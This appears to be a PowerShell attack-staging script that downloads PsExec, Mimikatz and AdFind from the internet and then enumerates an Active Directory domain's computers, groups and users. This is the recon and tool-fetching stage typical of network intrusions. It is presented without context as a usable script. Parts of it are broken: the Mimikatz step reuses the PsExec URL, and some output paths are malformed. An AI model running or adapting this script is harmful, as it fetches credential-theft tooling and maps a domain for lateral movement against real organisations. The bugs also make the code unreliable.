"Downloading PsExec"
$pstoolsUrl = 'https://download.sysinternals.com/files/PSTools.zip'
$outputPath = $PWD.Path+'\PSTools.zip'
$pstoolsPath = $PWD.Path+'\PSTools'
Invoke-WebRequest -Uri $pstoolsUrl -OutFile $outputPath
Expand-Archive -Path $outputPath -DestinationPath $pstoolsPath
"Downloading Mimikatz"
$mimikatzUrl = 'https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip'
$outputPath = $PWD.Path+'\mimikatz.zip'
$mimikatzPath = $PWD.Path+'\mimikatz'
Invoke-WebRequest -Uri $pstoolsUrl -OutFile $outputPath
Expand-Archive -Path $outputPath -DestinationPath $mimikatzPath
"Downloading AdFind"
$adfindUrl = "https://www.joeware.net/downloads/dl2.php"
$outputPath = $PWD.Path+"adfind.zip"
$adfindPath = $PWD.Path+"\adfind"
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$session.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
Invoke-WebRequest -UseBasicParsing -Uri $adfindUrl `
-Method "POST" `
-WebSession $session `
-Headers @{
"Accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
  "Accept-Encoding"="gzip, deflate, br"
  "Accept-Language"="he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7"
  "Cache-Control"="max-age=0"
  "Origin"="https://www.joeware.net"
  "Referer"="https://www.joeware.net/freetools/tools/adfind/"
  "Upgrade-Insecure-Requests"="1"

} `
-ContentType "application/x-www-form-urlencoded" `
-Body "download=AdFind.zip&email=&B1=Download+Now"  -OutFile $outputPath

Expand-Archive -Path $outputPath -DestinationPath $adfindPath
cd $adfindPath
.\adfind -f "objectcategory=computer" > ./../ adf_o.txt

"Checking up the domain"
net group /domain > n_g_d_o.txt
net users